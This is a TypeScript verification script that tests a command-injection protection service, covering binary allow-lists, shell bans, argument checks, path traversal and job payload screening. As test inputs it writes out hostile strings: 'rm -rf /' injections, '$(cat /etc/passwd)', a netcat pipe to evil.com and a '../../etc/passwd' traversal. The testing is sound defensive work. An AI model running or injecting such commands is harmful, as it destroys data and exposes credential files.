import { CommandInjectionProtectionService, CommandInjectionException } from "../CommandInjectionProtectionService";

console.log("================================================================================");
console.log(" 🛡️ MOAT ENTERPRISE COMMAND INJECTION PROTECTION — VERIFICATION RUNNER");
console.log("================================================================================\n");

let passedTests = 0;
let totalTests = 0;

function runTest(testName: string, testFn: () => void, expectedDescription: string) {
  totalTests++;
  try {
    testFn();
    passedTests++;
    console.log(`[PASS] Req #${totalTests}: ${testName} — ${expectedDescription}`);
  } catch (err: any) {
    console.log(`[FAIL] Req #${totalTests}: ${testName} — Exception:`, err.message);
  }
}

function expectException(fn: () => void, expectedCodeOrSnippet: string) {
  try {
    fn();
    throw new Error("Expected CommandInjectionException was not thrown!");
  } catch (err: any) {
    if (err.message.includes("Expected CommandInjectionException")) throw err;
    if (err instanceof CommandInjectionException || err.code === expectedCodeOrSnippet || err.message.includes(expectedCodeOrSnippet)) {
      return true;
    }
    throw new Error(`Expected exception with code '${expectedCodeOrSnippet}', got code '${err.code}' and message '${err.message}'`);
  }
}

// 1. Binary Allow-List Enforcement
runTest(
  "1. Strict System Binary Allow-List Authorization",
  () => {
    const valid = CommandInjectionProtectionService.assertAllowedCommand("pdftotext");
    if (valid !== "pdftotext") throw new Error("Binary name parsing failed");
    expectException(() => CommandInjectionProtectionService.assertAllowedCommand("evil_binary"), "UNAUTHORIZED_COMMAND_BINARY");
  },
  "Authorized permitted OS utilities and blocked unlisted binary execution."
);

// 2. Prohibit Interactive Shell Interpreters
runTest(
  "2. Shell Interpreter Execution Prohibition (sh, bash, cmd.exe)",
  () => {
    expectException(() => CommandInjectionProtectionService.assertAllowedCommand("sh"), "SHELL_EXECUTION_PROHIBITED");
    expectException(() => CommandInjectionProtectionService.assertAllowedCommand("/bin/bash"), "SHELL_EXECUTION_PROHIBITED");
    expectException(() => CommandInjectionProtectionService.assertAllowedCommand("cmd.exe"), "SHELL_EXECUTION_PROHIBITED");
    expectException(() => CommandInjectionProtectionService.assertAllowedCommand("powershell"), "SHELL_EXECUTION_PROHIBITED");
  },
  "Strictly blocked execution of shell interpreters to eliminate interactive command evaluation."
);

// 3. Command Argument Sanitization & Metacharacter Rejection
runTest(
  "3. Command Line Argument Sanitization & Operator Rejection",
  () => {
    const cleanArgs = CommandInjectionProtectionService.assertSafeCommandArgs(["--layout", "-q", "output.txt"]);
    if (cleanArgs.length !== 3) throw new Error("Argument parsing failed");

    expectException(() => CommandInjectionProtectionService.assertSafeCommandArgs(["output.txt; rm -rf /"]), "COMMAND_META_DETECTED");
    expectException(() => CommandInjectionProtectionService.assertSafeCommandArgs(["--file=$(cat /etc/passwd)"]), "COMMAND_META_DETECTED");
    expectException(() => CommandInjectionProtectionService.assertSafeCommandArgs(["file.txt | nc evil.com 1337"]), "COMMAND_META_DETECTED");
  },
  "Detected and rejected argument payloads containing command separators, pipes, and substitution operators."
);

// 4. File Path Traversal & Null Byte Protection
runTest(
  "4. File Operation Traversal (../../) & Null Byte Defense",
  () => {
    const validPath = CommandInjectionProtectionService.assertSafeFilePath("patents/doc123.pdf", "/var/storage/moat");
    if (!validPath.includes("doc123.pdf")) throw new Error("Path resolution failed");

    expectException(() => CommandInjectionProtectionService.assertSafeFilePath("../../etc/passwd", "/var/storage/moat"), "PATH_TRAVERSAL_REJECTED");
    expectException(() => CommandInjectionProtectionService.assertSafeFilePath("doc.pdf\x00.png", "/var/storage/moat"), "NULL_BYTE_DETECTED");
  },
  "Resolved and verified absolute paths within authorized storage boundaries while rejecting null byte spoofing."
);

// 5. Background Job Allow-List & Payload Inspection
runTest(
  "5. Background Job Identifier Allow-List & Payload Injection Inspection",
  () => {
    const job = CommandInjectionProtectionService.assertSafeBackgroundJob("PATENT_PDF_EXPORT", { patentId: "US-1029384-B2", exportFormat: "PDF" });
    if (job.jobName !== "PATENT_PDF_EXPORT") throw new Error("Job parsing failed");

    expectException(() => CommandInjectionProtectionService.assertSafeBackgroundJob("HACK_SYSTEM"), "UNAUTHORIZED_BACKGROUND_JOB");
    expectException(() => CommandInjectionProtectionService.assertSafeBackgroundJob("PATENT_PDF_EXPORT", { filter: "id=1; rm -rf /" }), "JOB_PAYLOAD_INJECTION_DETECTED");
  },
  "Enforced background job allow-lists and prevented command injection strings from being queued in worker payloads."
);

// 6. Safe Execution Config Generator (shell: false check)
runTest(
  "6. Safe Child Process Spawn Configuration Generator",
  () => {
    const config = CommandInjectionProtectionService.generateSafeExecutionConfig("pdftotext", ["-layout", "doc.pdf"]);
    if (config.command !== "pdftotext" || config.spawnOptions.shell !== false) {
      throw new Error(`Invalid spawn config generated: ${JSON.stringify(config)}`);
    }
  },
  "Generated validated spawn parameters enforcing shell: false and strict argument isolation."
);

console.log("\n================================================================================");
console.log(` 🏆 VERIFICATION SUMMARY: ${passedTests} / ${totalTests} REQUIREMENTS PASSED (${Math.round((passedTests / totalTests) * 100)}% COMPLIANT)`);
console.log("================================================================================\n");

if (passedTests !== totalTests) {
  process.exit(1);
}
